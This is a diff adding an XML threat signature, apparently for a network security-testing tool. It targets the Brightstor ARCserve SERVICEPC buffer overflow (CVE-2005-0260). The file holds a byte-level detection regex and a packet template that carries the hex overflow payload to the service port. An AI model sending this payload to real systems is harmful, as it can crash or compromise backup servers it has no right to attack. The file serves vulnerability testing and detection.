@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Brighstor ARCserve SERVICEPC Buffer Overflow"/>
+    <EngDesc display="true" value="This threat causes a buffer overflow in the Enterprise Discovery Service of Brightstor ARCserve.  Brighstor ARCserve typically listens on port 41523."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Buffer_Overflow"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Computer_Associates"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Computer_Associates_BrightStor_Enterprise_Backup"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Comuter_Associates_BrightStor_Enterprise_Backup_10.5"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/archive/1/390760"/>
+    <CVEID display="true" value="CVE-2005-0260"/>
+    <bugtraqID display="true" value="12536"/>
+    <OSVDB display="true" value="13814"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="16c3eeaec35294a5316522c3ca8732d9"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725867605781250"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X9B\X53\X45\X52\X56\X49\X43\X45\X50\X43\X41\X41\X41\X41\X41\X41\X41\X18\X41\X41\X41\XC0\XA8\X02\X67\X53\X45\X52\X56\X49\X43\X45\X50\X43\X41\X41\X41\X41\X41\X41\X41\X01\X41\X0C\X6C\X93\XCE\X18\X18\XBE\XBA\XAD\XDE\XDE\XC0\XAD\XDE"/>
+    <Created value="1155320307" display="true"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="ProprietarydestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$ProprietarydestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="9B5345525649434550434141414141414118414141C0A802675345525649434550434141414141414101410C6C93CE1818BEBAADDEDEC0ADDE" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
